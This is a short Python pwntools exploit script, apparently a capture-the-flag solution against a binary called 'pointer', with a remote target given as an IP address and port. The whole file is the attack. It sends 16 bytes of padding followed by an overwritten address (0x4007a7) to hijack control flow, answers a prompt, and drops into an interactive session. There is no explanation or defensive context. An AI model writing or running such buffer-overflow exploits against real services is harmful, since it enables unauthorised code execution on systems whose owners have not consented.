from pwn import  *
import sys

if len(sys.argv) == 1:
	p = process("./pointer")
else:
	p = remote("222.110.147.52",42632)


print p.recv()
payload = "a"*16
payload += p64(0x4007a7)
p.sendline(payload)
print p.recv()
p.sendline("Y")
p.interactive()
